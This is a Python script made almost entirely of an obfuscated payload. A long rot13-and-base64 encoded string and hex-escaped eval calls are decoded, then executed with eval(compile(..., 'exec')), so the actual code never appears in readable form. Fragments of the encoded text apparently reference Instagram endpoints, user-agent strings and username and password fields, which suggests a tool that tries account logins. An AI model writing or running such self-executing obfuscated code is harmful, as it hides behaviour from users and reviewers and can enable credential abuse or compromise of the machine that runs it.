import base64, codecs
magic = ''
love = 'JD4cJKVvxtVPNtVPNtVNbtVPNtVPNtVUOlnJ50XTLvr0u94cJt4cJDr1O94cn2r0W9r1I9VSqyoTAioJHtBagYsFO7K19spTyhJlqzqJkfK25uoJHaKK0hVPNtVPNtVPNtVPNtVPNtVPNtVUgVsrXIxFVcPvNtVPNtVPNtpUWcoaDbMvW7FU3vynQvyMO7HU3vyeM7Da17IK0tIKAypvN6r0g9VUgsK19jnJ5oW3ImMKWhLJ1yW119YvNtVPNtVPNtVPNtVPNtr0u94cJEVvxXVPNtVPNtVPOjpzyhqPuzVagVsrXIbBXIxUgDsrXJgagPsKgIsFOTo2kfo3qypvN6r0g9VUgsK19jnJ5oW2MioTkiq2IlK2AiqJ50W119YvNtVPNtVPNtVPNtVPNtVPNtr0u94cJEVvxXVPNtVPNtVPOjpzyhqPuzVagPsKgVsrXIbBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIaIkhVvxtPvNtVPOyrTAypUDtXRyCEKWlo3VcBtbtVPNtVPNtVUOlnJ50XTLvr1O9J3gAsFS7HU1qr019VZdMlc/ugV/ugV0t4oFA4oFNp+T0aBT0v+T0tZz0VBT0uBT0w+T0w+T0v8zd4oFUVvx7p2kyMKNbZlx7K19soT9anJ5sK18bXDbtVPNtMKuwMKO0VPuYMKySpaWipvx6PvNtVPNtVPNtpUWcoaDbMvW7HU1or019VKgDsI17GK0tD29in2yyVUCugVQXa+T0tZdpVZdMlc/ugV/ugVfvXGgipl5mrKA0MJ0bW3WgVP1lMvORLKEuY2Ain2xhqUu0VPLzVUWgVP1lMvORLKEuY3ImMKVhqUu0Wlx7p2kyMKNbZlx7K19soT9anJ5sK18bXDbtVPNtMKuwMKO0VPuWG0Ilpz9lXGbXVPNtVPNtVPOyrTy0XTLvr1O9J3gYsFS7HU1qr019VRiugV/WgBT0u+T0v3CWdvQugV3ugWjt4oFUlbQugV/XtPVcPvNtVPOjpzyhqPuzVagPsKgVsrXIyBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIylVcPvNtVPOjpzyhqPuzVagPsKgVsrXIbBXIxBXJgwS7Da1qr0W9VRGugWmugV3ugXxt4oFpp+T0u8dNloGugVQugV3ugVpt4oFS4oFNlbQWdvQugV3ugVsWgZzvlneugViugWmugWiWdv57HU17FU0t4cJEVvxXVPNtVUOlnJ50XTLvr0W9r0u94cJt4cJD4cn2ZagPsI17Da0t4oFS4oFp4oFA4oFcVBT0aUCugVsXtZz04oFN4oFA4oFUVBT0urT0tZdNlnbt4oFc4oFUloGWbfzd4oFY4oFp4oFoYagDsKgVsFNt4cJEVvxXVPNtVUOlnJ50XTLvr0W9r0u94cJt4cJD4cn2Z3gPsI17Da0t4oFS4oFp4oFA4oFcVBT0aUCugVsXtZz04oFN4oFA4oFUVBT0urT0tZdNlnbt4oFN4oFR4oFolneugXQWdhT0z8dCYvO7HU17FU0t4cJEVvxXVPNtVUOlnJ50XTLvr0W9r0u94cJt4cJD4cn2AUgPsI17Da0t4oFS4oFp4oFA4oFcVBT0aUCugVsXtZz04oFN4oFA4oFUVBT0urT0tZdNlnbtlcaugVsXtBT0tZz04oFS4oFNYvNtr1O9r0u9VBXIxFVcPvNtVPOjpzyhqPuzVagPsKgVsrXIbBXIxBXJgwI7Da1qr0W9VBT0urT0aBT0wrT0dFQugWkm4oFUlbQWgBT0tBT0wrT0ulQugVKugVQXtZzdVZdp4oFNp+T0z+T0tZzvYvNtVUgDsKgVsFQvyMRvXDbtVPNtpUWcoaDbMvW7Da17FU3vynQvyMQvyeL5r0W9KKgPsFQugV3ugWmXa+T0tZzdVBT0uZdN4oFN4oFR4oFYVUgDsIg7FU3FxhT0tUCugWg7HU1qr0u9VPNtVPNtVPNtVPNt4cJEVvxXVPNtVUOlnJ50XTLvr0W9r0u94cJt4cJD4cn2ZUgPsI17Da0tlcmugVOmlneXalQugVGXtBT0tBT0uBT0vlQXa8zdlcmugVQugWfhVPNtVPNtVPNtVUgDsKgVsFNt4cJEVvxXVPNtVUOlnJ50XTLvr0W9r0u94cJt4cJD4cn2DKgPsI17Da0t4oFY4oFUlc/ugWmugVQXtPO7HU1or0194oFUrZzd4oFor1O9KKgAsF4tVUgDsKgVsFNtVPNtVPNtVPNtVPNt4cJEVvxXVPNtVUOlnJ50XTLvr0W9r0u94cJt4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJqKT4vXFNXVPNtVNbtVPNtK19spTyfnJttCFOcoaO1qPuzVagVsIg7HU0/r0u9KKgIsFQugXaWdfdslneXaPN6r0g9VPVcPvNtVPOcMvOsK19jnJkcnPOcovOoWmRaYPpjZFqqBvNtVPNWVPNtVPNtVPNtVNbtVPNtVPNtVS9sK21yozqcn3I0nI9sKltcPvNtVPOyoTyzVS9sK3OcoTybVTyhVSfaZvpfWmNlW106PvNtVPNtVPNtK19spTIhM2yeqKEsK18bXDbtVPNtMJkcMvOsK19jnJkcnPOcovOoWmZaYPpjZlqqBtbtVPNtVPNtVS9sK2SwqTy2nKE5K19sXPxXVPNtVTIfnJLtK19spTyfnJttnJ4tJlp0WljaZQDaKGbXVPNtVPNtVPOsK19vMKWuozEuK19sXPxXVPNtVTIfnJLtK19spTyfnJttnJ4tJlp1WljaZQHaKGbXVPNtVPNtVPOsK19bLKA0LJqsK18bXDbtVPNtMJkcMvOsK19jnJkcnPOcovOoWmLaYPpjAvqqBtbtVPNtVPNtVS9sK3AyLKWwnS9sKltcPvNtVPOyoTyzVS9sK3OcoTybVTyhVSfaAlpfWmN3W106PvNtVPNtVPNtK19spKIypaysK18bXDbtVPNtMJkcMvOsK19jnJkcnPOcovOoWmtaYPpjBPqqBtbtVPNtVPNtVS9sK2IgLJyfK19sXPxXVPNtVTIfnJLtK19spTyfnJttnJ4tJlp5WljaZQxaKGbXVPNtVPNtVPOsK19jpz94rI9sKltcPvNtVPOyoTyzVS9sK3OcoTybVTyhVSfaZPpfWmNjW106PvNtVPNtVPNtqUW5BvNtVPNtVPNWVPNtVPNtVPNtVPNtVPNtPvNtVPNtVPNtVPNtVUOlnJ50XTLvKT57FU1or1O9ZKgVsI17FU0tlc/Wdfdp4oFN4oFoVZdp4oFNp8zdlc8t4oFC4oFYVvxXVPNtVPNtVPNtVPNtpUWcoaDbMvW7FU1or1O9ZagVsI17FU0tlc/Wdfdp4oFN4oFoVZdp4oFNp8zdlc8t4oFR4oFcVvxXVPNtVPNtVPNtVPNtpUWcoaDbMvW7FU1or1O9Z3gVsI17FU0t4oFY4oFU4oFAlcaugVQXa8zdKT4vXDbtVPNtVPNtVPNtVPOsK19bLKAcoPN9VTyhpUI0XTLvr0W9J3gDsG97Da1qr0W9VBT0dpzdlc/WdfdpVQc7F30tVvxXVPNtVPNtVPNtVPNtnJLtK19snTSmnJjtnJ4tJlpkWljaZQRaKGbtVPNtVPNtVPNtVPNWVPNtVPNtVPNtVPNtVPNtVPNtVPNtVNbtVPNtVPNtVPNtVPNtVPNtpUWcoaDbMvW7F30tVvx7o3Zhp3ymqTIgXPqwLKDtHzImqJk0pl9Cnl50rUDaXDbtVPNtVPNtVPNtVPOyoTyzVS9sK2uup2yfVTyhVSfaZvpfWmNlW106PvNtVPNtVPNtVPNtVPNtVPOjpzyhqPuzVagYsFNvXGgipl5mrKA0MJ0bW2AuqPOFMKA1oUEmY0AjYaE4qPpcPvNtVPNtVPNtVPNtVTIfnJLtK19snTSmnJjtnJ4tJlpmWljaZQZaKGbXVPNtVPNtVPNtVPNtVPNtVS9sK21yoaIsK18bXDbtVPNtVPNtVPNtVPOyoUAyBtbtVPNtVPNtVPNtVPNtVPNtMKucqPuzVagDsIg7GK0ur1O9KKgAsFOgMJ5anTSjqKZtL29in2xvXDbtVPNtVPNtVTI4L2IjqQcjLKAmPvNtVPOyoTyzVS9sK3OcoTybVTyhVSfaLFpfW0RaKGbXVPNtVPNtVPOjpzyhqPuzVagDsIg7F30ur1O9KKgYsFQugXaXtBT0w3CugVqmVZdp4oFN4oFc4oFpplQugVGugV/ugV/ugViWdhT0ul4hYvVcB29mYaA5p3EyoFtapz0tYKWzVREuqTRiL29enF50rUDtWvLtpz0tYKWzVREuqTRiqKAypv50rUDaXGgyrTy0XPxXVPNtVTIfp2H6PvNtVPNtVPNtMKucqPuzVagDsIg7F30ur1O9KKgAsFQugVeugVQWgZzv4oFNloDt4oFY4oFCp+T0w8z0lnVvXDbwVRE1oKNtGJIhM2yeqKEcPzEyMvOsK19gMJ5anJg1qTysK18bXGbXVPNtVUElrGbXVPNtVPNtVPOsK191p2IlVQ0tnJ5jqKDbMvWpoagVsIg7HU0/r0u9KKgDsFOIp2IlVQc7F30tVvxXVPNtVPNtVPOcMvOsK191p2IlJmbkKFOcovOoWmRaYPplWljaZlpfWmDaYPp1WljaAvpfWmpaYPp4WljaBFpfWmNaKGbXVPNtVPNtVPNtVPNtMKucqPuzVagDsIg7GK0ur1O9KKgAsFQWbhT0aZz04oFN4oFY4oFNloDt4oFpp+T0u8dNloGugVQugV3ugVpvXDbtVPNtVPNtVTIfp2H6PvNtVPNtVPNtVPNtVS9sK3OcovN9VUWypKIyp3EmYzqyqPuzW2u0qUOmBv8iq3q3Yzyhp3EuM3WuoF5wo20ir19sK3ImMKW9Ym9sK2R9ZFpfVTuyLJEypaZtCFO7W3ImMKVgLJqyoaDaBvNaGJ96nJkfLF81YwNtXRkcoaI4BlOOozElo2yxVQRjBlOGGF1UBGpmEvOPqJyfMP9EHQSOYwR5ZQpkZF4jZwN7VUq2XFOOpUOfMIqyLxgcqP81ZmphZmLtXRgVIR1ZYPOfnJgyVRqyL2giXFOJMKWmnJ9hYmDhZPOQnUWioJHiBQLhZP40ZwDjYwR5BPOAo2WcoTHtH2SzLKWcYmHmAl4mAvOWoaA0LJqlLJ0tZGL2YwRhZP40Zv4lAQHtDJ5xpz9cMPNbZwxiZGN7VQDlZTEjnGftZGN4ZUtlZQDlBlOmLJ1mqJ5aBlOGGF1UBGpmEwftLzI5o25xZGftMKu5oz9mBGtlZQftMJ5sE0V7VQV1AwN5BGVjAPxaYPNaL29in2yyWmbto3OyovtaETS0LF9wo2gcYaE4qPpfW3VaXF5lMJSxXPy9XF5dp29hXPyoW2qlLKObpJjaKIfaqKAypvqqPvNtVPNtVPNtVPNtVUOlnJ50XTLvr0u9J3gDsG97FU1qr1O9VR5uoJHtBagYsFO7K19spTyhJlqzqJkfK25uoJHaKK1povVcPvNtVPNtVPNtVPNtVS9sK2McoTHtCFNbK19spTyhJlqzqJkfK25uoJHaKF5lMKOfLJAyXPptWljaKlpcXlphqUu0WlxXVPNtVPNtVPO3nKEbVUWypKIyp3EmYyAyp3Aco24bXFOuplOmMKZ6PvNtVPNtVPNtVPNtVS9sK3OcovN9VUAypl5aMKDbMvqbqUEjpmbiY2xhnJ5mqTSapzSgYzAioF9upTxiqwRiMaWcMJ5xp2ucpUZir19sK3OcoyfvnJDvKK0iMz9foT93nJ5aYm9wo3IhqQ01ZQNjWljtnTIuMTIlplN9VUfaqKAypv1uM2IhqPp6VPqAo3ccoTkuYmHhZPNbGTyhqKt7VRShMUWinJDtZGN7VSAAYHp5AmATVRW1nJkxY1SDZHRhZGxjAmRkYwNlZQftq3LcVRSjpTkyI2IvF2y0YmHmAl4mAvNbF0uHGHjfVTkcn2HtE2Iwn28cVSMypaAco24iAP4jVRAbpz9gMF84Av4jYwDlAQNhZGx4VR1iLzyfMFOGLJMupzxiAGZ3YwZ2VRyhp3EuM3WuoFNkAwLhZF4jYwDlYwV0AFOOozElo2yxVPtlBF8kZQftAQVjMUOcBlNkZQtjrQVjAQV7VUAuoKA1ozp7VSAAYHp5AmATBlOvMKyiozDkBlOyrUyho3Z5BQVjBlOyoy9UDwftZwH2ZQx5ZwN0XFpfVPqwo29enJHaBvOipTIhXPqRLKEuY2Ain2xhqUu0WljapvpcYaWyLJDbXK0cYzcmo24bXDbtVPNtVPNtVPNtVPOzo3VtrvOcovOsK19jnJ5oW3ImMKWmW106PvNtVPNtVPNtVPNtVPNtVPOipTIhXPqRqJ1jYlpeK19sMzyfMFjtW2RaXF53pzy0MFu6Jlq1p2IlozSgMFqqXlp8CG4aX3coW2M1oTksozSgMFqqXlqpovpcPvNtVPNtVPNtVPNtVPNtVPOjpzyhqPuzVagIsKg6Jlq1p2IlozSgMFqqsGj9Cag6JlqzqJkfK25uoJHaKK0vXDbtVPNtVPNtVPNtVPOjpzyhqPuzVykhr0W9J3gDsFc7Da1qr1I9VUCugVsXa+T0u3CugVQWdv4hYvVcPvNtVPNtVPNtVPNtVUOlnJ50XTLvr0W9J3gDsG97Da1qr1I9VAXGlneXa+T0ulQugWiugVsXtUCWdhT0wrT0drT0tZz0VBT0upzdVQc7F30tEUIgpP97K19sMzyfMK0vXDbtVPNtVPNtVPNtVPOcoaO1qPuzVagAsIg7IK3ugViugVsugV3XzrT0tZdslnc7GK1qr1O9Vvx7K19soJIhqI9sKltcPvNtVPOyrTAypUDtXRgyrHIlpz9lXGbXVPNtVPNtVPOyrTy0XTLvr1O9J3gAsFS7HU1qr019VBT0urT0aBT0wrT0dFQWgZdC4oFNVZzv4oFNlnYugVQXalVcPvNtVPOyrTAypUDtXRAioz5yL3Eco25SpaWipvx6PvNtVPNtVPNtMKucqPuzVagDsIg7GK0ur1O9KKgAsFQugViugV/WgBT0u+T0v3CWdvQugV3ugWjt4oFUlbQugV/XtPVcPvZtEUIgpPODMJ5anJg1qNcxMJLtK19spTIhM2yeqKEsK18bXGbXVPNtVUElrGbXVPNtVPNtVPOsK191p2IlVQ0tnJ5jqKDbMvWpoagVsIg7HU0/r0u9KKgDsFOIp2IlVQc7F30tVvxXVPNtVPNtVPOcMvOsK191p2IlJmbkKFOcovOoWmRaYPplWljaZlpfWmDaYPp1WljaAvpfWmpaYPp4WljaBFpfWmNaKGbXVPNtVPNtVPNtVPNtMKucqPuzVagDsIg7GK0ur1O9KKgAsFQWbhT0aZz04oFN4oFY4oFNloDt4oFpp+T0u8dNloGugVQugV3ugVpvXDbtVPNtVPNtVTIfp2H6PvNtVPNtVPNtVPNtVS9sK3OcovN9VUWypKIyp3EmYzqyqPuzW2u0qUOmBv8iq3q3Yzyhp3EuM3WuoF5wo20ir19sK3ImMKW9Ym9sK2R9ZFpfVTuyLJEypaZtCFO7W3ImMKVgLJqyoaDaBvNaGJ96nJkfLF81YwNtXRkcoaI4BlOOozElo2yxVQRjBlOGGF1UBGpmEvOPqJyfMP9EHQSOYwR5ZQpkZF4jZwN7VUq2XFOOpUOfMIqyLxgcqP81ZmphZmLtXRgVIR1ZYPOfnJgyVRqyL2giXFOJMKWmnJ9hYmDhZPOQnUWioJHiBQLhZP40ZwDjYwR5BPOAo2WcoTHtH2SzLKWcYmHmAl4mAvOWoaA0LJqlLJ0tZGL2YwRhZP40Zv4lAQHtDJ5xpz9cMPNbZwxiZGN7VQDlZTEjnGftZGN4ZUtlZQDlBlOmLJ1mqJ5aBlOGGF1UBGpmEwftLzI5o25xZGftMKu5oz9mBGtlZQftMJ5sE0V7VQV1AwN5BGVjAPxaYPNaL29in2yyWmbto3OyovtaETS0LF9wo2gcYaE4qPpfW3VaXF5lMJSxXPy9XF5dp29hXPyoW2qlLKObpJjaKIfaqKAypvqqPvNtVPNtVPNtVPNtVUOlnJ50XTLvr0u9J3gDsG97FU1qr1O9VR5uoJHtBagYsFO7K19spTyhJlqzqJkfK25uoJHaKK1povVcPvNtVPNtVPNtVPNtVS9sK2McoTHtCFNbK19spTyhJlqzqJkfK25uoJHaKF5lMKOfLJAyXPptWljaKlpcXlphqUu0WlxXVPNtVPNtVPO3nKEbVUWypKIyp3EmYyAyp3Aco24bXFOuplOmMKZ6PvNtVPNtVPNtVPNtVS9sK3OcovN9VUAypl5aMKDbMvqbqUEjpmbiY2xhnJ5mqTSapzSgYzAioF9upTxiqwRiMaWcMJ5xp2ucpUZir19sK3OcoyfvnJDvKK0iMz9foT93MKWmYm9wo3IhqQ01ZQNjWljtnTIuMTIlplN9VUfaqKAypv1uM2IhqPp6VPqAo3ccoTkuYmHhZPNbGTyhqKt7VRShMUWinJDtZGN7VSAAYHp5AmATVRW1nJkxY1SDZHRhZGxjAmRkYwNlZQftq3LcVRSjpTkyI2IvF2y0YmHmAl4mAvNbF0uHGHjfVTkcn2HtE2Iwn28cVSMypaAco24iAP4jVRAbpz9gMF84Av4jYwDlAQNhZGx4VR1iLzyfMFOGLJMupzxiAGZ3YwZ2VRyhp3EuM3WuoFNkAwLhZF4jYwDlYwV0AFOOozElo2yxVPtlBF8kZQftAQVjMUOcBlNkZQtjrQVjAQV7VUAuoKA1ozp7VSAAYHp5AmATBlOvMKyiozDkBlOyrUyho3Z5BQVjBlOyoy9UDwftZwH2ZQx5ZwN0XFpfVPqwo29enJHaBvOipTIhXPqRLKEuY2Ain2xhqUu0WljapvpcYaWyLJDbXK0cYzcmo24bXDbtVPNtVPNtVPNtVPOzo3VtrvOcovOsK19jnJ5oW3ImMKWmW106PvNtVPNtVPNtVPNtVPNtVPOipTIhXPqRqJ1jYlpeK19sMzyfMFjtW2RaXF53pzy0MFu6Jlq1p2IlozSgMFqqXlp8CG4aX3coW2M1oTksozSgMFqqXlqpovpcPvNtVPNtVPNtVPNtVPNtVPOjpzyhqPuzVagDsKg6Jlq1p2IlozSgMFqqsGj9Cag6JlqzqJkfK25uoJHaKK0vXDbtVPNtVPNtVPNtVPOjpzyhqPuzVykhr0W9J3gDsFc7Da1qr1I9VUCugVsXa+T0u3CugVQWdv4hYvVcPvNtVPNtVPNtVPNtVUOlnJ50XTLvr0W9J3gDsG97Da1qr1I9VAXGlneXa+T0ulQugWiugVsXtUCWdhT0wrT0drT0tZz0VBT0upzdVQc7F30tEUIgpP97K19sMzyfMK0vXDbtVPNtVPNtVPNtVPOcoaO1qPuzVagAsIg7IK3ugViugVsugV3XzrT0tZdslnc7GK1qr1O9Vvx7K19soJIhqI9sKltcPvNtVPOyrTAypUDtXRgyrHIlpz9lXGbXVPNtVPNtVPOyrTy0XTLvr1O9J3gAsFS7HU1qr019VBT0urT0aBT0wrT0dFQWgZdC4oFNVZzv4oFNlnYugVQXalVcPvNtVPOyrTAypUDtXRAioz5yL3Eco25SpaWipvx6PvNtVPNtVPNtMKucqPuzVagDsIg7F30ur1O9KKgYsFQugViugV/WgBT0u+T0v3CWdvQugV3ugWjt4oFUlbQugV/XtPVcPvZtEUIgpPOOL3Ecqzy0rDcxMJLtK19sLJA0nKMcqUysK18bXGbXVPNtVUElrGbXVPNtVPNtVPOsK19znJkyVQ0tnJ5jqKDbMvWpoagVsIg7HU0/r0u9KKgPsFQWgBT0tBT0wrT0tPQFx8zdlc/ugVptBagYsFNvXF5lMKOfLJAyXPptWljaKlpcPvNtVPNtVPNtnJLtK19sMzyfMFOcovOoWlpfWlNaKGbXVPNtVPNtVPNtVPNtMKucqPuzVagDsIg7GK0ur1O9KKgAsFQugVeugVQWgZzv4oFNloDt4oFY4oFCp+T0w8z0lnVvXDbtVPNtVPNtVTIfp2H6PvNtVPNtVPNtVPNtVUOlnJ50XTLvr1O9VPVcPvNtVPNtVPNtVPNtVS9sK3OcovN9VUWypKIyp3EmYzqyqPtanUE0pUZ6Yl93q3phnJ5mqTSapzSgYzAioF9uL2AiqJ50pl9uL3Ecqzy0rF8/K19uCGRaYPObMJSxMKWmVQ0trlq1p2IlYJSaMJ50WmbtW01irzyfoTRiAF4jVPuZnJ51rQftDJ5xpz9cMPNkZQftH00gEmx3Z0LtDaIcoTDiHINkDF4kBGN3ZGRhZQVjBlO3qvxtDKOjoTIKMJWYnKDiAGZ3YwZ2VPuYFSEAGPjtoTyeMFOUMJAeolxtIzIlp2yiov80YwNtD2ulo21yYmt2YwNhAQV0ZP4kBGttGJ9vnJkyVSAuMzSlnF81Zmph'
god = ''
destiny = ''
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))